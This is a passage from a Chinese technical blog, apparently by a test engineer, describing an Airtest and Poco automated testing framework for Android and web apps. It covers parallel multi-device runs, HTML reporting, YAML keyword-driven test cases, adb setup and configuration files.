class="string">:&quot;真机1&quot;</span>&#125;, &#123;<span class="string">&quot;dev&quot;</span><span class="string">:&quot;emulator-5554&quot;</span>,<span class="string">&quot;test_module&quot;</span><span class="string">:</span>[<span class="string">&quot;他的&quot;</span>],<span class="string">&quot;phone&quot;</span><span class="string">:&quot;雷电&quot;</span>&#125;]</span><br><span class="line"><span class="comment">#test_case = [&#123;&quot;dev&quot;:&quot;emulator-5554&quot;,&quot;test_module&quot;:[&quot;他的&quot;],&quot;phone&quot;:&quot;雷电&quot;&#125;]</span></span><br></pre></td></tr></table></figure>

<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>使用 <code>pool = Pool() pool.map(self.run_case1, data[&quot;test_case&quot;])</code>达到多进程并行设备</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## runner3.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动入口代码，和之前单机一样，读取配置文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_case</span>(<span class="params">data</span>):</span><br><span class="line">  	...</span><br><span class="line">    test = CustomAirtestCase(data[<span class="string">&quot;root_path&quot;</span>], data[<span class="string">&quot;dev_connect&quot;</span>])</span><br><span class="line">    test.run_air(data)</span><br><span class="line"></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">run_air</span>(<span class="params">self, data</span>):</span><br><span class="line">        self.recording = data[<span class="string">&quot;recording&quot;</span>]</span><br><span class="line">        self.report_host = <span class="string">&quot;http://&quot;</span> + data[<span class="string">&quot;report_host&quot;</span>] + <span class="string">&quot;:&quot;</span> + data[<span class="string">&quot;local_host_port&quot;</span>]</span><br><span class="line">        <span class="comment"># 开启本地http服务器</span></span><br><span class="line">        threading.Thread(target=HttpServer.start, args=(),</span><br><span class="line">                         kwargs=&#123;<span class="string">&quot;local_host_path&quot;</span>: data[<span class="string">&quot;local_host_path&quot;</span>], <span class="string">&quot;report_host&quot;</span>: data[<span class="string">&quot;report_host&quot;</span>],<span class="string">&quot;port&quot;</span>: data[<span class="string">&quot;local_host_port&quot;</span>]&#125;).start()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 整个用例开始执行时间</span></span><br><span class="line">        start_time = datetime.now().strftime(<span class="string">&quot;%H:%M:%S&quot;</span>)</span><br><span class="line">        pool = Pool()</span><br><span class="line">        pool.<span class="built_in">map</span>(self.run_case1, data[<span class="string">&quot;test_case&quot;</span>])</span><br><span class="line">      	...</span><br><span class="line">        <span class="comment"># 记录数据采用放到json文件中</span></span><br><span class="line">        test_modules_dev = Runner3Common.get_case_module_dev(PATH(<span class="string">&quot;config/case_data.json&quot;</span>))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;==设备=%s&quot;</span> % test_modules_dev)</span><br><span class="line">        Runner3Common.set_result_summary_json(&#123;<span class="string">&quot;total_time&quot;</span>: total_time, <span class="string">&quot;phone&quot;</span>: test_modules_dev[<span class="string">&quot;test_dev&quot;</span>], <span class="string">&quot;modules&quot;</span>: test_modules_dev[<span class="string">&quot;test_modules&quot;</span>]&#125;)</span><br><span class="line">      </span><br><span class="line"><span class="comment"># 不同的手机执行不同模块用例</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_case1</span>(<span class="params">self, data_item</span>):</span><br><span class="line">    _dev = data_item[<span class="string">&quot;dev&quot;</span>]</span><br><span class="line">    <span class="comment"># 记录测试设备</span></span><br><span class="line">    Runner3Common.set_case_module_dev(&#123;<span class="string">&quot;test_dev&quot;</span>: _dev&#125;)</span><br><span class="line">    <span class="comment"># 记录测试模块</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data_item[<span class="string">&quot;test_module&quot;</span>]:</span><br><span class="line">        <span class="comment"># 获取到用例列表</span></span><br><span class="line">        get_case_data = Runner3Common.get_cases(data_item, _dev, self.root_path)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> get_case_data:</span><br><span class="line">            air_device = [self.dev_connect + _dev]  <span class="comment"># 取设备</span></span><br><span class="line">            <span class="comment"># 执行用例</span></span><br><span class="line">            run(root_dir=self.root_path, test_case=i, device=air_device, local_host_path=self.local_host_path,log_date=self.log_date,</span><br><span class="line">                recording=self.recording, report_host=self.report_host, phone=data_item[<span class="string">&quot;phone&quot;</span>])</span><br><span class="line">     </span><br><span class="line"><span class="comment"># 执行用例这里代码和单机的代码相差不多，把 rpt = report.LogToHtml这里生成日志文件代码写在了这里</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">root_dir, test_case, device, local_host_path, log_date, recording, report_host, phone</span>):</span><br><span class="line">    script = os.path.join(root_dir, test_case[<span class="string">&quot;module&quot;</span>], test_case[<span class="string">&quot;case&quot;</span>])</span><br><span class="line">    log_host_path = os.path.join(test_case[<span class="string">&quot;module&quot;</span>], test_case[<span class="string">&quot;case&quot;</span>].replace(<span class="string">&#x27;.air&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    log = os.path.join(local_host_path, log_host_path)</span><br><span class="line">    os.makedirs(log)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(log) + <span class="string">&#x27; 创建日志文件成功&#x27;</span>)</span><br><span class="line">    output_file = os.path.join(log, <span class="string">&#x27;log.html&#x27;</span>)</span><br><span class="line">    args = Namespace(device=device, log=log, compress=<span class="literal">None</span>, recording=recording, script=script, no_image=<span class="literal">None</span>)</span><br><span class="line">    <span class="comment"># 用例开始执行日期</span></span><br><span class="line">    st_date = datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">    <span class="comment"># 用例开始执行时间</span></span><br><span class="line">    s_time = datetime.now().strftime(<span class="string">&quot;%H:%M:%S&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        run_script(args, AirtestCase)</span><br><span class="line">        is_success = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        is_success = <span class="literal">False</span></span><br><span class="line">    end_date = datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">    <span class="comment"># 用例结束执行时间</span></span><br><span class="line">    e_time = datetime.now().strftime(<span class="string">&quot;%H:%M:%S&quot;</span>)</span><br><span class="line">    <span class="comment"># 用例耗时时间</span></span><br><span class="line">    sum_time = get_case_total_time(s_time, e_time)</span><br><span class="line">    <span class="comment"># 生成测试用例的详情报告</span></span><br><span class="line">    rpt = report.LogToHtml(script, log, report_host + <span class="string">&quot;/report&quot;</span>,</span><br><span class="line">                           log_host=report_host + <span class="string">&quot;/log/&quot;</span> + log_date + <span class="string">&quot;/&quot;</span> + log_host_path)</span><br><span class="line"></span><br><span class="line">    rpt.report(<span class="string">&quot;log_template.html&quot;</span>, output_file=output_file)</span><br></pre></td></tr></table></figure>

<h3 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h3><p><img src="/aposts/5a751e2b/image-20220121115858698.png" alt="image-20220121115858698"></p>
<ul>
<li>测试结果的列表页面，优化了下页面</li>
</ul>
<p><img src="/aposts/5a751e2b/image-20220124111600060.png" alt="image-20220124111600060"></p>
<p><img src="/aposts/5a751e2b/image-20220121120048939.png" alt="image-20220121120048939"></p>
<h3 id="关键字驱动"><a href="#关键字驱动" class="headerlink" title="关键字驱动"></a>关键字驱动</h3><ul>
<li>airtest中也能实现关键字驱动？当然也可以</li>
<li>用例调用逻辑</li>
</ul>
<p><img src="/aposts/5a751e2b/image-20220124112127781.png" alt="image-20220124112127781"></p>
<ul>
<li>yml中的用例格式</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">poco(text=&quot;取消&quot;).click()</span> <span class="string">if</span> <span class="string">poco(text=&quot;取消&quot;).exists()</span> <span class="string">else</span> <span class="string">print(&quot;&quot;)</span></span><br><span class="line"><span class="comment"># 点击我的关注</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">poco(&quot;com.jianshu.haruki:id/tv_guanzhu&quot;).click()</span></span><br><span class="line"><span class="comment"># 点击动态下最近更新的作者第一条数据</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">poco(&quot;com.jianshu.haruki:id/userIcon&quot;).click()</span></span><br></pre></td></tr></table></figure>

<ul>
<li>解析yml中的用例，知道此逻辑后，可以定义任意关键字</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">operate_test_case</span>(<span class="params">poco, yml</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    读取yml用例文件,执行用例</span></span><br><span class="line"><span class="string">    :param poco:</span></span><br><span class="line"><span class="string">    :param yml:</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    handing_error(poco)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(yml, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        d = yaml.safe_load(f)</span><br><span class="line">    <span class="comment"># 启动应用后的容错</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">        <span class="comment"># 寻找关键字click</span></span><br><span class="line">        event_click = i.split(<span class="string">&quot;.click()&quot;</span>)</span><br><span class="line">        <span class="comment"># 寻找关键字if</span></span><br><span class="line">        event_if = i.split(<span class="string">&quot;if&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;元素为：%s&quot;</span> % i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;操作元素开始时间：%s&quot;</span> % datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>))</span><br><span class="line">        <span class="comment"># 非if语句的click事件</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(event_click) &gt; <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">len</span>(event_if) == <span class="number">1</span>:</span><br><span class="line">            <span class="comment"># 利用eval把字符串转换为函数,每次点击之前智能等待</span></span><br><span class="line">            <span class="built_in">eval</span>(event_click[<span class="number">0</span>] + <span class="string">&quot;.wait_for_appearance(5)&quot;</span>)</span><br><span class="line">            <span class="comment"># 执行用例</span></span><br><span class="line">            <span class="built_in">eval</span>(i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 其他的poco事件</span></span><br><span class="line">            sleep(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">eval</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;操作元素结束时间：%s&quot;</span> % datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 操作元素后的容错</span></span><br><span class="line">        handing_error(poco)</span><br></pre></td></tr></table></figure>

<ul>
<li>如果有写逻辑比较复杂，不适合写到yml中，可以混合使用，比如下面这样写用例：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">operate</span>():</span><br><span class="line">    poco = AndroidUiautomationPoco(use_airtest_input=<span class="literal">True</span>, screenshot_each_action=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 初始化用例</span></span><br><span class="line">        init_app()</span><br><span class="line">        poco(text=<span class="string">&quot;取消&quot;</span>).click() <span class="keyword">if</span> poco(text=<span class="string">&quot;取消&quot;</span>).exists() <span class="keyword">else</span> <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">         </span><br><span class="line">        </span><br><span class="line">        case_path = os.path.join(path, <span class="string">&quot;yml&quot;</span>, <span class="string">&quot;xxx&quot;</span>)</span><br><span class="line">        operate_test_case(poco, case_path)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 点击我的</span></span><br><span class="line">        poco(<span class="string">&quot;com.jianshu.haruki:id/tv_more_menu&quot;</span>).wait(<span class="number">5</span>).click()</span><br><span class="line">        <span class="comment"># 点击我的文章</span></span><br><span class="line">        poco(text=<span class="string">&quot;我的文章&quot;</span>).wait(<span class="number">5</span>).click()</span><br><span class="line">        <span class="comment"># 向上滑动</span></span><br><span class="line">        poco(<span class="string">&quot;com.jianshu.haruki:id/refresh_view&quot;</span>).focus([<span class="number">0.5</span>, <span class="number">0.5</span>]).swipe([<span class="number">0.5</span>, -<span class="number">0.5</span>])</span><br><span class="line">        </span><br><span class="line">        case_path = os.path.join(path, <span class="string">&quot;yml&quot;</span>, <span class="string">&quot;oooo&quot;</span>)</span><br><span class="line">        operate_test_case(poco, case_path)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        snapshot(msg=<span class="string">&quot;报错后截图&quot;</span>)</span><br><span class="line">        <span class="keyword">raise</span> e</span><br></pre></td></tr></table></figure>

<h2 id="多机web"><a href="#多机web" class="headerlink" title="多机web"></a>多机web</h2><ul>
<li>代码逻辑几乎一样，只是把Namespace方法中的devicec传为None</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> device == <span class="string">&quot;web&quot;</span>:</span><br><span class="line">       air_device = <span class="literal">None</span></span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       air_device = [dev_connect + device] </span><br><span class="line">...</span><br><span class="line">   args = Namespace(device=air_device, log=log, compress=<span class="literal">None</span>, recording=recording, script=script, no_image=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>配置文件略有不同</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># setting1.yaml</span><br><span class="line">[default]</span><br><span class="line"># 手机名字</span><br><span class="line">phone=谷歌浏览器</span><br><span class="line"></span><br><span class="line"># android|ios|web，当填如web时，需要填写驱动文件位置</span><br><span class="line">platform =web</span><br><span class="line">driver_path=E:\proj\airtest_auto\util\chromedriver.exe</span><br><span class="line"></span><br><span class="line">[multi]</span><br><span class="line"># 如果是web测试，dev一定要填web</span><br><span class="line">test_case = [&#123;&quot;dev&quot;:&quot;web&quot;,&quot;test_module&quot;: [&quot;home&quot;],&quot;phone&quot;:&quot;谷歌浏览器1&quot;&#125;, &#123;&quot;dev&quot;:&quot;web&quot;,&quot;test_module&quot;:[&quot;home2&quot;],&quot;phone&quot;:&quot;谷歌浏览器2&quot;&#125;]</span><br></pre></td></tr></table></figure>

<ul>
<li>用例编写</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding=utf8 -*-</span></span><br><span class="line"><span class="keyword">from</span> airtest.core.api <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># pip3 install pynput</span></span><br><span class="line"><span class="comment"># pip3 install airtest-selenium</span></span><br><span class="line"><span class="comment"># 得到绝对路径</span></span><br><span class="line"></span><br><span class="line">abs_path = os.path.abspath(os.path.dirname(__file__))</span><br><span class="line"><span class="comment"># 得到公共用例目录</span></span><br><span class="line">common_path = os.path.join(abs_path.split(<span class="string">&quot;airtest_auto&quot;</span>)[<span class="number">0</span>], <span class="string">&quot;airtest_auto&quot;</span>, <span class="string">&quot;web_util&quot;</span>)</span><br><span class="line">sys.path.append(common_path)</span><br><span class="line"><span class="keyword">from</span> web_util <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">driver = get_driver()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    driver.get(<span class="string">&quot;http://www.baidu.com&quot;</span>)</span><br><span class="line">    driver.find_element_by_id(<span class="string">&quot;kw&quot;</span>).send_keys(<span class="string">&quot;test&quot;</span>)</span><br><span class="line">    driver.find_element_by_id(<span class="string">&quot;su&quot;</span>).click()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    snapshot(msg=<span class="string">&quot;报错后截图&quot;</span>)</span><br><span class="line">    <span class="keyword">raise</span> e</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    driver.close()</span><br></pre></td></tr></table></figure>

<ul>
<li>测试结果</li>
</ul>
<p><img src="/aposts/5a751e2b/image-20220124173817575.png" alt="image-20220124173817575"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>还有一种最优方案是，后台有个监控任务，不停的读取用例队列，每台手机运行20条用例（可设置）多台并行，手机(设备)不够就等待，手机有空闲后，分配用例队列中的用例，直到用例全部分配完毕。</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://louis-me.github.io/aposts/6e64669e/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="一个正经的测试工程师">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="施坤的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/aposts/6e64669e/" class="post-title-link" itemprop="url">aritest自动化测试框架设计</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-01-18 15:16:03" itemprop="dateCreated datePublished" datetime="2022-01-18T15:16:03+08:00">2022-01-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-25 11:20:56" itemprop="dateModified" datetime="2022-02-25T11:20:56+08:00">2022-02-25</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">自动化测试</span></a>
                </span>
            </span>

          
            <span id="/aposts/6e64669e/" class="post-meta-item leancloud_visitors" data-flag-title="aritest自动化测试框架设计" title="阅读次数">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/aposts/6e64669e/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/aposts/6e64669e/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li>基于Airtest设计的自动化测试框架</li>
</ul>
<h2 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h2><ul>
<li>AirtestIDE-win-1.2.13 请自行安装，用来调试用例</li>
<li>此次装的python版本为 3.7.9</li>
<li>本地电脑的adb设置为AirtestIDE中的路径</li>
</ul>
<p><img src="/aposts/6e64669e/image-20220118152720452.png" alt="image-20220118152720452"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Admin&gt;adb</span><br><span class="line">Android Debug Bridge version 1.0.40</span><br><span class="line">Version 4986621</span><br><span class="line">Installed as E:\exe\AirtestIDE\airtest\core\android\static\adb\windows\adb.exe</span><br></pre></td></tr></table></figure>

<ul>
<li>安装依赖文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install -U airtest</span><br><span class="line">pip install -U pocoui</span><br></pre></td></tr></table></figure>

<ul>
<li>本次测试机器使用雷电模拟器，真机也可以</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Admin&gt;adb devices</span><br><span class="line">List of devices attached</span><br><span class="line">emulator-5554   device</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>安装测试apk文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;adb install -g -r C:\Users\Admin\Downloads\com.jianshu.haruki_6.4.4_liqucn.com.apk</span><br></pre></td></tr></table></figure>

<ul>
<li>在模拟器中打开手动登录</li>
<li>复制python环境中的Lib目录的airtest下的report文件到新建文件夹下面（E:\proj\aritest）<ul>
<li>放生成的测试报告和日志文件，默认放到项目中，对项目管理非常不友好</li>
</ul>
</li>
</ul>
<p><img src="/aposts/6e64669e/image-20220118164513042.png" alt="image-20220118164513042"></p>
<ul>
<li>然后新建一个log文件，用来放测试用例报告的</li>
</ul>
<p><img src="/aposts/6e64669e/image-20220118164740800.png" alt="image-20220118164740800"></p>
<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><h3 id="启动器"><a href="#启动器" class="headerlink" title="启动器"></a>启动器</h3><ul>
<li><p>启动器代码做到和用例文件分离，现在启动器支撑ios(待测试)，android（已测试），web（待测试），理论上airtest支持的都支持</p>
</li>
<li><p>启动器需要取配置文件进行，配置文件如下</p>
</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">default</span>]</span><br><span class="line"><span class="comment"># 包名</span></span><br><span class="line"><span class="string">pkg</span> <span class="string">=</span> <span class="string">com.jianshu.haruki</span></span><br><span class="line"><span class="comment"># 手机名字</span></span><br><span class="line"><span class="string">phone=雷电模拟器</span></span><br><span class="line"><span class="comment"># 设备连接名字</span></span><br><span class="line"><span class="string">dev_connect=Android://127.0.0.1:5037/emulator-5554</span></span><br><span class="line"><span class="comment">#dev_connect=Android://127.0.0.1:5037/ZL9LC685V86DNNMN</span></span><br><span class="line"><span class="comment"># 用例目录</span></span><br><span class="line"><span class="string">root_path=E:\proj\airtest_auto\air_case\android</span></span><br><span class="line"> <span class="comment"># test_plan=1 表示调试用例需要配合test_module使用，0表示全部用例</span></span><br><span class="line"><span class="string">test_plan=1</span></span><br><span class="line"><span class="string">test_module=[&quot;我的&quot;]</span></span><br><span class="line"><span class="comment"># false|true 表示是否运行用例之前，删除log文件夹，删除后会影响查看历史报告</span></span><br><span class="line"><span class="string">remove_log=true</span></span><br><span class="line"><span class="comment"># false|true 是否开启录屏,若传true就会自动录屏，但是在模拟器上录屏失败，只使用于真机</span></span><br><span class="line"><span class="string">recording=false</span></span><br><span class="line"><span class="comment"># android|ios|web，当填如web时，需要填写驱动文件位置</span></span><br><span class="line"><span class="string">platform</span> <span class="string">=android</span></span><br><span class="line"><span class="comment"># driver_path=E:\proj\airtest_auto\exe\chromedriver.exe</span></span><br><span class="line"><span class="string">driver_path=</span></span><br><span class="line"><span class="comment"># 服务器信的信息，比如本地的http服务器，用来展示报告</span></span><br><span class="line"><span class="string">report_host=http://172.31.105.196:8000</span></span><br><span class="line"><span class="comment"># 本地服务器路径，我把源代码中的report也放在里面了</span></span><br><span class="line"><span class="string">local_host_path=E:\proj\aritest</span></span><br><span class="line"><span class="comment"># 本地服务器端口</span></span><br><span class="line"><span class="string">local_host_port=8000</span></span><br><span class="line">[<span class="string">mail</span>]</span><br><span class="line"><span class="comment"># 是否启动发送邮件,传false|true</span></span><br><span class="line"><span class="string">enable</span> <span class="string">=false</span></span><br><span class="line"><span class="comment"># 收件人</span></span><br><span class="line"><span class="string">recipient</span> <span class="string">=[&quot;284772894@qq.com&quot;,&quot;284772895@qq.com&quot;]</span></span><br><span class="line"><span class="comment"># 发件人smtp</span></span><br><span class="line"><span class="string">mail_host</span> <span class="string">=</span> <span class="string">smtp.126.com</span></span><br><span class="line"><span class="comment"># 发件人</span></span><br><span class="line"><span class="string">mail_user</span> <span class="string">=</span> <span class="string">ashikun@126.com</span></span><br><span class="line"><span class="comment"># 授权码</span></span><br><span class="line"><span class="string">mail_pass</span> <span class="string">=</span> <span class="string">XXXXX</span></span><br><span class="line"><span class="string">port</span> <span class="string">=</span> <span 